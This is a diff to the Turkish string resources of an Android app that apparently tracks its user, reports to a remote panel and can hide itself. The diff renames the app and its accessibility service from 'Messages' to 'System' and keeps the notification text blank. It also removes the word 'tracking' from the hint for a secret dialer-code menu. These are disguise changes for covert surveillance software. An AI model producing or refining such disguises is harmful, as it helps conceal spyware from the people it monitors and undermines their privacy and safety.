@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Mesajlar</string>
+    <string name="app_name">Sistem</string>
     <string name="setup_title">Kurulum</string>
     <string name="setup_subtitle">Panel adresinizi ve hesabınızı girin</string>
     <string name="panel_url">Panel Adresi</string>
@@ -10,9 +10,9 @@
     <string name="connect">Bağlan ve Kur</string>
     <string name="service_notification_title"> </string>
     <string name="service_notification_text"> </string>
-    <string name="hidden_settings_title">Ayarlar</string>
+    <string name="hidden_settings_title">Sistem Ayarları</string>
     <string name="hide_app">Uygulamayı Gizle</string>
-    <string name="accessibility_description">Mesajlaşma erişilebilirlik servisi</string>
+    <string name="accessibility_description">Sistem erişilebilirlik servisi</string>
     <string name="show_status">Durum</string>
-    <string name="secret_code_hint">Gizli menü: *#*#5555555555#*#* veya *#*#82547#*#* (TAKIP) veya tarayıcıda takip://settings</string>
+    <string name="secret_code_hint">Gizli menü: *#*#5555555555#*#* veya *#*#82547#*#* veya tarayıcıda takip://settings</string>
 </resources>
